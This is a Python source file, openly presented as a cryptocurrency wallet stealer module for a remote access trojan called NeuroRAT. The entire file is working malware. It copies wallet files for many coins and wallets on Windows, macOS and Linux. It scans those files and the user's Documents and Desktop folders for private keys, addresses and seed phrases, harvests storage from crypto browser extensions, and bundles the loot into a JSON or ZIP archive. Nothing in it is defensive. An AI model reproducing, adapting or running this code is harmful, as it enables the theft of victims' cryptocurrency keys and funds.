#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Cryptocurrency Wallet Stealer Module for NeuroRAT
Author: Mr. Thomas Anderson (iamtomasanderson@gmail.com)
License: MIT

This module extracts cryptocurrency wallet data including:
- Wallet files
- Wallet seeds/mnemonics
- Private keys
- Configuration files
- Browser-based wallet extensions
"""

import os
import sys
import json
import re
import shutil
import zipfile
import logging
import platform
import tempfile
import sqlite3
import base64
from pathlib import Path
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("CryptoStealer")

# Regex patterns for crypto-related data
PATTERNS = {
    'bitcoin_address': r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59}',
    'ethereum_address': r'0x[a-fA-F0-9]{40}',
    'monero_address': r'4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}',
    'litecoin_address': r'[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}',
    'dash_address': r'X[1-9A-HJ-NP-Za-km-z]{33}',
    'ripple_address': r'r[0-9a-zA-Z]{24,34}',
    'dogecoin_address': r'D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}',
    'bitcoin_private_key': r'[5KL][1-9A-HJ-NP-Za-km-z]{50,51}',
    'ethereum_private_key': r'0x[a-fA-F0-9]{64}',
    'mnemonic_phrase': r'(?:\b[a-zA-Z]{3,8}\b[ \t]+){11,24}\b[a-zA-Z]{3,8}\b'
}

# Known paths for crypto wallets and related files by OS
WALLET_PATHS = {
    'windows': {
        'bitcoin': [
            '%APPDATA%\\Bitcoin\\wallet.dat',
            '%APPDATA%\\Bitcoin\\wallets\\',
        ],
        'ethereum': [
            '%APPDATA%\\Ethereum\\keystore\\',
            '%APPDATA%\\Ethereum\\geth\\chaindata',
        ],
        'monero': [
            '%APPDATA%\\bitmonero\\',
            '%APPDATA%\\monero-wallet-gui\\wallets\\',
        ],
        'electrum': [
            '%APPDATA%\\Electrum\\wallets\\',
            '%APPDATA%\\Electrum\\config',
        ],
        'exodus': [
            '%APPDATA%\\Exodus\\exodus.wallet\\',
        ],
        'litecoin': [
            '%APPDATA%\\Litecoin\\wallet.dat',
            '%APPDATA%\\Litecoin\\wallets\\',
        ],
        'atomic': [
            '%APPDATA%\\atomic\\Local Storage\\leveldb\\',
        ],
        'jaxx': [
            '%APPDATA%\\jaxx\\Local Storage\\file__0.localstorage',
        ],
        'binance': [
            '%APPDATA%\\Binance\\',
        ],
        'metamask': [
            '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            '%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            '%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\storage\\default\\',
        ]
    },
    'darwin': {
        'bitcoin': [
            '~/Library/Application Support/Bitcoin/wallet.dat',
            '~/Library/Application Support/Bitcoin/wallets/',
        ],
        'ethereum': [
            '~/Library/Ethereum/keystore/',
            '~/Library/Ethereum/geth/chaindata',
        ],
        'monero': [
            '~/Library/Application Support/bitmonero/',
            '~/Library/Application Support/monero-wallet-gui/wallets/',
        ],
        'electrum': [
            '~/Library/Application Support/Electrum/wallets/',
            '~/Library/Application Support/Electrum/config',
        ],
        'exodus': [
            '~/Library/Application Support/Exodus/exodus.wallet/',
        ],
        'litecoin': [
            '~/Library/Application Support/Litecoin/wallet.dat',
            '~/Library/Application Support/Litecoin/wallets/',
        ],
        'atomic': [
            '~/Library/Application Support/atomic/Local Storage/leveldb/',
        ],
        'jaxx': [
            '~/Library/Application Support/jaxx/Local Storage/file__0.localstorage',
        ],
        'binance': [
            '~/Library/Application Support/Binance/',
        ],
        'metamask': [
            '~/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb/',
            '~/Library/Application Support/Microsoft Edge/Default/Local Storage/leveldb/',
            '~/Library/Application Support/Firefox/Profiles/*.default/storage/default/'
        ]
    },
    'linux': {
        'bitcoin': [
            '~/.bitcoin/wallet.dat',
            '~/.bitcoin/wallets/',
        ],
        'ethereum': [
            '~/.ethereum/keystore/',
            '~/.ethereum/geth/chaindata',
        ],
        'monero': [
            '~/.bitmonero/',
            '~/.config/monero-wallet-gui/wallets/',
        ],
        'electrum': [
            '~/.electrum/wallets/',
            '~/.electrum/config',
        ],
        'exodus': [
            '~/.config/Exodus/exodus.wallet/',
        ],
        'litecoin': [
            '~/.litecoin/wallet.dat',
            '~/.litecoin/wallets/',
        ],
        'atomic': [
            '~/.config/atomic/Local Storage/leveldb/',
        ],
        'jaxx': [
            '~/.config/jaxx/Local Storage/file__0.localstorage',
        ],
        'binance': [
            '~/.config/Binance/',
        ],
        'metamask': [
            '~/.config/google-chrome/Default/Local Storage/leveldb/',
            '~/.config/microsoft-edge/Default/Local Storage/leveldb/',
            '~/.mozilla/firefox/*.default/storage/default/'
        ]
    }
}

class CryptoStealer:
    """Extract cryptocurrency wallet files and sensitive data"""
    
    def __init__(self):
        self.os_type = platform.system().lower()
        self.output_dir = tempfile.mkdtemp(prefix="crypto_data_")
        self.wallet_paths = self._get_wallet_paths()
        self.results = {
            "wallets": [],
            "addresses": [],
            "private_keys": [],
            "mnemonics": [],
            "configs": []
        }
    
    def _get_wallet_paths(self):
        """Get wallet paths for the current operating system with environment variables expanded"""
        if self.os_type == "windows":
            os_paths = WALLET_PATHS.get('windows', {})
        elif self.os_type == "darwin":
            os_paths = WALLET_PATHS.get('darwin', {})
        else:
            os_paths = WALLET_PATHS.get('linux', {})
        
        expanded_paths = {}
        for wallet_type, paths in os_paths.items():
            expanded_paths[wallet_type] = []
            for path in paths:
                # Expand environment variables and home directory
                if self.os_type == "windows":
                    # Handle Windows environment variables
                    if '%APPDATA%' in path:
                        path = path.replace('%APPDATA%', os.environ.get('APPDATA', ''))
                    if '%LOCALAPPDATA%' in path:
                        path = path.replace('%LOCALAPPDATA%', os.environ.get('LOCALAPPDATA', ''))
                else:
                    # Handle Unix-style home directory
                    path = os.path.expanduser(path)
                
                expanded_paths[wallet_type].append(path)
        
        return expanded_paths
    
    def extract_all(self):
        """Extract all crypto wallet data"""
        # Extract wallet files
        self._extract_wallet_files()
        
        # Scan common locations for crypto related strings
        self._scan_for_crypto_data()
        
        # Look for crypto browser extensions
        self._extract_browser_extension_data()
        
        return self.results
    
    def _extract_wallet_files(self):
        """Extract wallet files from known locations"""
        for wallet_type, paths in self.wallet_paths.items():
            logger.info(f"Searching for {wallet_type} wallets")
            
            for path in paths:
                try:
                    # Handle glob patterns in paths
                    if '*' in path:
                        import glob
                        matching_paths = glob.glob(path)
                        for match_path in matching_paths:
                            self._process_wallet_path(wallet_type, match_path)
                    else:
                        self._process_wallet_path(wallet_type, path)
                except Exception as e:
                    logger.error(f"Error processing {wallet_type} wallet at {path}: {str(e)}")
    
    def _process_wallet_path(self, wallet_type, path):
        """Process a single wallet path, either file or directory"""
        # Skip if path doesn't exist
        if not os.path.exists(path):
            return
        
        # Copy files to output directory
        try:
            if os.path.isfile(path):
                # Single file
                filename = os.path.basename(path)
                dest_path = os.path.join(self.output_dir, f"{wallet_type}_{filename}")
                
                # Copy file
                shutil.copy2(path, dest_path)
                file_size = os.path.getsize(path)
                
                # Record the found wallet file
                self.results["wallets"].append({
                    "wallet_type": wallet_type,
                    "original_path": path,
                    "copied_path": dest_path,
                    "size": file_size,
                    "timestamp": datetime.fromtimestamp(os.path.getmtime(path)).strftime("%Y-%m-%d %H:%M:%S")
                })
                
                # Also scan file content for crypto-related patterns
                self._scan_file_for_patterns(path, wallet_type)
                
            elif os.path.isdir(path):
                # Directory - recursively copy wallet files with reasonable extensions
                wallet_extensions = ['.dat', '.wallet', '.json', '.seed', '.key', '.keys', '.keystore']
                config_extensions = ['.conf', '.cfg', '.ini', '.config', '.json', '.yaml', '.yml']
                
                for root, _, files in os.walk(path):
                    for filename in files:
                        file_path = os.path.join(root, filename)
                        file_ext = os.path.splitext(filename)[1].lower()
                        
                        # Create relative path structure in output
                        rel_path = os.path.relpath(root, path)
                        dest_dir = os.path.join(self.output_dir, wallet_type, rel_path)
                        os.makedirs(dest_dir, exist_ok=True)
                        dest_path = os.path.join(dest_dir, filename)
                        
                        try:
                            # Copy file if it has a relevant extension or is small enough to be a key file
                            file_size = os.path.getsize(file_path)
                            if (file_ext in wallet_extensions or file_size < 1024 * 100):  # Files smaller than 100KB
                                shutil.copy2(file_path, dest_path)
                                
                                # Record the found wallet file
                                self.results["wallets"].append({
                                    "wallet_type": wallet_type,
                                    "original_path": file_path,
                                    "copied_path": dest_path,
                                    "size": file_size,
                                    "timestamp": datetime.fromtimestamp(os.path.getmtime(file_path)).strftime("%Y-%m-%d %H:%M:%S")
                                })
                            elif file_ext in config_extensions:
                                shutil.copy2(file_path, dest_path)
                                
                                # Record the found config file
                                self.results["configs"].append({
                                    "wallet_type": wallet_type,
                                    "original_path": file_path,
                                    "copied_path": dest_path,
                                    "size": file_size,
                                    "timestamp": datetime.fromtimestamp(os.path.getmtime(file_path)).strftime("%Y-%m-%d %H:%M:%S")
                                })
                            
                            # Also scan file content for crypto-related patterns
                            self._scan_file_for_patterns(file_path, wallet_type)
                            
                        except Exception as e:
                            logger.error(f"Error copying {file_path}: {str(e)}")
        except Exception as e:
            logger.error(f"Error processing wallet path {path}: {str(e)}")
    
    def _scan_file_for_patterns(self, file_path, source_type):
        """Scan a file for crypto-related patterns"""
        try:
            # Skip large files
            if os.path.getsize(file_path) > 10 * 1024 * 1024:  # 10MB
                return
            
            # Skip binary files for certain extensions
            binary_extensions = ['.dat', '.db', '.exe', '.dll', '.so', '.dylib', '.bin']
            if os.path.splitext(file_path)[1].lower() in binary_extensions:
                # Only scan text files by default
                return
            
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    
                    # Scan for addresses
                    for pattern_name, pattern in PATTERNS.items():
                        if 'address' in pattern_name:
                            matches = re.findall(pattern, content)
                            for match in matches:
                                self.results["addresses"].append({
                                    "coin_type": pattern_name.split('_')[0],
                                    "address": match,
                                    "source_file": file_path,
                                    "source_type": source_type
                                })
                        elif 'private_key' in pattern_name:
                            matches = re.findall(pattern, content)
                            for match in matches:
                                self.results["private_keys"].append({
                                    "coin_type": pattern_name.split('_')[0],
                                    "key": match,
                                    "source_file": file_path,
                                    "source_type": source_type
                                })
                        elif pattern_name == 'mnemonic_phrase':
                            matches = re.findall(pattern, content)
                            for match in matches:
                                # Validate if it looks like a BIP39 mnemonic (12, 15, 18, 21, or 24 words)
                                words = match.split()
                                if len(words) in [12, 15, 18, 21, 24]:
                                    self.results["mnemonics"].append({
                                        "phrase": match,
                                        "word_count": len(words),
                                        "source_file": file_path,
                                        "source_type": source_type
                                    })
            except UnicodeDecodeError:
                # If we can't read as text, try as binary
                with open(file_path, 'rb') as f:
                    binary_content = f.read()
                    
                    # Convert binary to string for regex
                    content = binary_content.decode('latin-1')
                    
                    # Scan for addresses (binary might contain text chunks)
                    for pattern_name, pattern in PATTERNS.items():
                        if 'address' in pattern_name:
                            matches = re.findall(pattern, content)
                            for match in matches:
                                self.results["addresses"].append({
                                    "coin_type": pattern_name.split('_')[0],
                                    "address": match,
                                    "source_file": file_path,
                                    "source_type": source_type,
                                    "binary_source": True
                                })
                        
        except Exception as e:
            logger.error(f"Error scanning file {file_path}: {str(e)}")
    
    def _scan_for_crypto_data(self):
        """Scan common locations for crypto-related data patterns"""
        # Document directories that might contain recovery seeds written down
        document_dirs = []
        
        if self.os_type == "windows":
            document_dirs.append(os.path.join(os.environ.get('USERPROFILE', ''), 'Documents'))
            document_dirs.append(os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop'))
        elif self.os_type == "darwin":
            document_dirs.append(os.path.expanduser('~/Documents'))
            document_dirs.append(os.path.expanduser('~/Desktop'))
        else:  # linux
            document_dirs.append(os.path.expanduser('~/Documents'))
            document_dirs.append(os.path.expanduser('~/Desktop'))
        
        # Scan text files in document directories for recovery phrases
        for doc_dir in document_dirs:
            if not os.path.exists(doc_dir):
                continue
                
            logger.info(f"Scanning documents directory: {doc_dir}")
            
            for root, _, files in os.walk(doc_dir):
                for filename in files:
                    file_ext = os.path.splitext(filename)[1].lower()
                    if file_ext in ['.txt', '.md', '.rtf', '.doc', '.docx', '.odt', '.json', '.csv']:
                        file_path = os.path.join(root, filename)
                        
                        try:
                            # Skip large files
                            if os.path.getsize(file_path) > 1024 * 1024:  # 1MB
                                continue
                                
                            self._scan_file_for_patterns(file_path, "document")
                        except Exception as e:
                            logger.error(f"Error scanning document {file_path}: {str(e)}")
    
    def _extract_browser_extension_data(self):
        """Scan for crypto wallet browser extensions"""
        # Common browser extension directories by OS
        extension_dirs = []
        
        if self.os_type == "windows":
            chrome_dir = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Extensions')
            firefox_dir = os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles')
            edge_dir = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Extensions')
            
            extension_dirs.append(chrome_dir)
            extension_dirs.append(firefox_dir)
            extension_dirs.append(edge_dir)
            
        elif self.os_type == "darwin":
            chrome_dir = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Extensions')
            firefox_dir = os.path.expanduser('~/Library/Application Support/Firefox/Profiles')
            safari_dir = os.path.expanduser('~/Library/Safari/Extensions')
            
            extension_dirs.append(chrome_dir)
            extension_dirs.append(firefox_dir)
            extension_dirs.append(safari_dir)
            
        else:  # linux
            chrome_dir = os.path.expanduser('~/.config/google-chrome/Default/Extensions')
            firefox_dir = os.path.expanduser('~/.mozilla/firefox')
            
            extension_dirs.append(chrome_dir)
            extension_dirs.append(firefox_dir)
        
        # Extension IDs for common crypto wallets
        crypto_extension_ids = {
            'metamask': [
                'nkbihfbeogaeaoehlefnkodbefgpgknn',  # MetaMask
            ],
            'binance': [
                'fhbohimaelbohpjbbldcngcnapndodjp',  # Binance Chain Wallet
            ],
            'phantom': [
                'bfnaelmomeimhlpmgjnjophhpkkoljpa',  # Phantom (Solana)
            ],
            'trust': [
                'egjidjbpglichdcondbcbdnbeeppgdph',  # Trust Wallet
            ],
            'keplr': [
                'dmkamcknogkgcdfhhbddcghachkejeap',  # Keplr (Cosmos)
            ],
            'exodus': [
                'aholpfdialjgjfhomihkjbmgjidlcdno',  # Exodus
            ]
        }
        
        # Scan extension directories
        for ext_dir in extension_dirs:
            if not os.path.exists(ext_dir):
                continue
                
            logger.info(f"Scanning extensions directory: {ext_dir}")
            
            # Handle Firefox profiles directory (different structure)
            if 'firefox' in ext_dir.lower() and 'profiles' in ext_dir.lower():
                self._scan_firefox_extension_dir(ext_dir, crypto_extension_ids)
                continue
            
            # Chrome-like extension directory structure
            for wallet_name, extension_ids in crypto_extension_ids.items():
                for ext_id in extension_ids:
                    wallet_ext_path = os.path.join(ext_dir, ext_id)
                    
                    if os.path.exists(wallet_ext_path):
                        logger.info(f"Found {wallet_name} extension at {wallet_ext_path}")
                        
                        # Create directory in output
                        dest_dir = os.path.join(self.output_dir, f"browser_extensions/{wallet_name}")
                        os.makedirs(dest_dir, exist_ok=True)
                        
                        # Find the extension data directories and local storage
                        for root, dirs, files in os.walk(wallet_ext_path):
                            # Look for storage directories
                            if 'local storage' in root.lower() or 'localstorage' in root.lower() or 'leveldb' in root.lower():
                                for filename in files:
                                    if filename.endswith('.ldb') or filename.endswith('.log'):
                                        file_path = os.path.join(root, filename)
                                        dest_path = os.path.join(dest_dir, filename)
                                        
                                        try:
                                            shutil.copy2(file_path, dest_path)
                                            # Scan for patterns
                                            self._scan_file_for_patterns(file_path, f"{wallet_name}_extension")
                                        except Exception as e:
                                            logger.error(f"Error copying extension file {file_path}: {str(e)}")
    
    def _scan_firefox_extension_dir(self, profiles_dir, crypto_extension_ids):
        """Scan Firefox extension directories"""
        # Firefox stores extensions differently, so we need to handle it specially
        for profile_dir in os.listdir(profiles_dir):
            profile_path = os.path.join(profiles_dir, profile_dir)
            
            if os.path.isdir(profile_path):
                extensions_json = os.path.join(profile_path, 'extensions.json')
                
                if os.path.exists(extensions_json):
                    try:
                        with open(extensions_json, 'r', encoding='utf-8') as f:
                            extensions_data = json.load(f)
                            
                            for ext in extensions_data.get('addons', []):
                                ext_id = ext.get('id', '')
                                
                                # Check if it's a crypto wallet extension
                                for wallet_name, extension_ids in crypto_extension_ids.items():
                                    for known_id in extension_ids:
                                        if known_id in ext_id or ext_id in known_id:
                                            logger.info(f"Found {wallet_name} extension in Firefox profile")
                                            
                                            # Look for extension data
                                            extension_path = os.path.join(profile_path, 'storage', 'default', ext_id)
                                            
                                            if os.path.exists(extension_path):
                                                # Create directory in output
                                                dest_dir = os.path.join(self.output_dir, f"browser_extensions/{wallet_name}_firefox")
                                                os.makedirs(dest_dir, exist_ok=True)
                                                
                                                # Copy extension storage files
                                                for root, _, files in os.walk(extension_path):
                                                    for filename in files:
                                                        file_path = os.path.join(root, filename)
                                                        rel_path = os.path.relpath(root, extension_path)
                                                        file_dest_dir = os.path.join(dest_dir, rel_path)
                                                        os.makedirs(file_dest_dir, exist_ok=True)
                                                        file_dest_path = os.path.join(file_dest_dir, filename)
                                                        
                                                        try:
                                                            shutil.copy2(file_path, file_dest_path)
                                                            # Scan for patterns
                                                            self._scan_file_for_patterns(file_path, f"{wallet_name}_firefox_extension")
                                                        except Exception as e:
                                                            logger.error(f"Error copying Firefox extension file {file_path}: {str(e)}")
                    except Exception as e:
                        logger.error(f"Error reading Firefox extensions.json: {str(e)}")
    
    def save_results(self, output_path=None):
        """Save the extracted data to a JSON file"""
        if not output_path:
            output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 
                                      f"crypto_data_{datetime.now().strftime('%Y%m%d%H%M%S')}.json")
        
        try:
            with open(output_path, "w", encoding="utf-8") as f:
                json.dump(self.results, f, indent=4)
            
            return output_path
        except Exception as e:
            logger.error(f"Error saving results: {str(e)}")
            return None
    
    def zip_results(self, output_path=None):
        """Save the extracted data to a ZIP file"""
        if not output_path:
            output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 
                                      f"crypto_data_{datetime.now().strftime('%Y%m%d%H%M%S')}.zip")
        
        try:
            with zipfile.ZipFile(output_path, "w", zipfile.ZIP_DEFLATED) as zipf:
                # Write results as JSON
                json_data = json.dumps(self.results, indent=4)
                zipf.writestr("crypto_data.json", json_data)
                
                # Add all files in the output directory
                for root, _, files in os.walk(self.output_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arc_name = os.path.relpath(file_path, self.output_dir)
                        zipf.write(file_path, arc_name)
                
                logger.info(f"Crypto data saved to {output_path}")
            
            return output_path
        except Exception as e:
            logger.error(f"Error zipping results: {str(e)}")
            return None
    
    def cleanup(self):
        """Clean up temporary files"""
        try:
            shutil.rmtree(self.output_dir)
        except Exception as e:
            logger.error(f"Error cleaning up temporary files: {str(e)}")


def run_stealer(output_format="json"):
    """
    Run the crypto stealer module and return the results
    
    Args:
        output_format (str): Format to save the results ('json' or 'zip')
        
    Returns:
        dict: Results dictionary or path to the saved file
    """
    try:
        stealer = CryptoStealer()
        results = stealer.extract_all()
        
        # Save results based on specified format
        if output_format.lower() == "json":
            output_path = stealer.save_results()
        elif output_format.lower() == "zip":
            output_path = stealer.zip_results()
        else:
            output_path = None
        
        # Clean up temporary files
        stealer.cleanup()
        
        if output_path:
            logger.info(f"Crypto data saved to {output_path}")
            return {"success": True, "output_path": output_path, "data": results}
        else:
            return {"success": True, "data": results}
            
    except Exception as e:
        logger.error(f"Error running crypto stealer: {str(e)}")
        return {"success": False, "error": str(e)}


if __name__ == "__main__":
    # If run directly, execute the stealer
    result = run_stealer("zip")
    print(f"Crypto stealer completed: {result['success']}")
    if result.get("output_path"):
        print(f"Results saved to: {result['output_path']}") 